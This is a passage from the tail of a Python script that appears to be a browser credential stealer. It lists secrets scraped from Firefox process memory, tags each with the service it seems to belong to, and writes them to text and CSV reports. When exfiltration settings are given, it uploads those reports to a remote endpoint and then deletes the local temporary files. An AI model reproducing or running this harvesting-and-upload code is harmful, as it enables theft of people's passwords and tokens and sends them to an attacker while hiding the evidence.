                lines.append("  [-] No hits found")
            else:
                lines.append(f"[+] {len(unique_ff)} unique hit(s)  (across {len(ff_pids)} PID(s))\n")
                for h in unique_ff:
                    h["_svc"] = identify_service(h["label"], h["value"], h.get("context", b""))
                    val = _trunc(h["value"].replace("\n", "\\n").replace("\r", "\\r"))
                    lines.append(f"  {h['label'][:22]:<22}  {h['_svc'][:28]:<28}  {val}")
                    all_csv_rows.append({
                        "browser": ff_name, "profile": "(memory)",
                        "label": h["label"], "service": h["_svc"],
                        "value": h["value"], "address": h.get("address", ""),
                    })

    report = "\n".join(lines)

    _using_temp = False
    if args.out:
        out_path = args.out
    elif _EXFIL_URL:
        _tmp     = tempfile.NamedTemporaryFile(suffix=".txt", delete=False)
        out_path = _tmp.name
        _tmp.close()
        _using_temp = True
    elif getattr(sys, "frozen", False):
        out_path = os.path.join(os.path.dirname(sys.executable), "bb_results.txt")
    else:
        out_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bb_results.txt")

    with open(out_path, "w", encoding="utf-8") as f:
        f.write(report)

    csv_path = out_path.replace(".txt", ".csv") if out_path.endswith(".txt") else out_path + ".csv"
    if all_csv_rows:
        import csv as _csv
        with open(csv_path, "w", newline="", encoding="utf-8") as f:
            writer = _csv.DictWriter(f, fieldnames=["browser", "profile", "label", "service", "value", "address"])
            writer.writeheader()
            writer.writerows(all_csv_rows)

    if args.exfil and args.exfil_key:
        report_url = _exfil_results(args.exfil, args.exfil_key, out_path, csv_path if all_csv_rows else None)
        if report_url and not _using_temp:
            with open(out_path, "a", encoding="utf-8") as f:
                f.write(f"\n[+] Exfil: {report_url}\n")

    if _using_temp:
        try:
            os.remove(out_path)
            if os.path.exists(csv_path):
                os.remove(csv_path)
        except OSError:
            pass



if __name__ == "__main__":
    try:
        main()
    except Exception:
        import traceback
        if getattr(sys, "frozen", False):
            err_path = os.path.join(os.path.dirname(sys.executable), "bb_error.txt")
        else:
            err_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bb_error.txt")
        with open(err_path, "w") as f:
            f.write(traceback.format_exc())
